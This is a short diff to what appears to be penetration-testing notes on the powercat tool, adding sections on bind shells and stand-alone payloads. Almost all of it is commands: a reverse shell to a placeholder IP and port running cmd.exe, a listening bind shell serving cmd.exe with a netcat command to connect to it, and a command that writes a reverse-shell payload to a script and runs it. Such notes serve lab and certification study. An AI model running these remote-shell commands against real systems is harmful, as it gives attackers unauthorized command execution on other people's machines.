@@ -321,3 +321,20 @@ After script loaded:
  powercat -c <ip> -p <port> -e cmd.exe
 ```
 
+## Powercat Bind Shells
+```powershell
+ powercat -l -p <port> -e cmd.exe
+```
+
+```bash
+ nc <ip> <port>
+```
+
+## Powercat Stand-Alone Payloads
+- Powercat can also generate stand-alone payloads In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user.
+- 
+```powershell
+ powercat -c <ip> -p <port> -e cmd.exe -g > revershell.ps1
+ 
+ ./revershell.ps1
+```
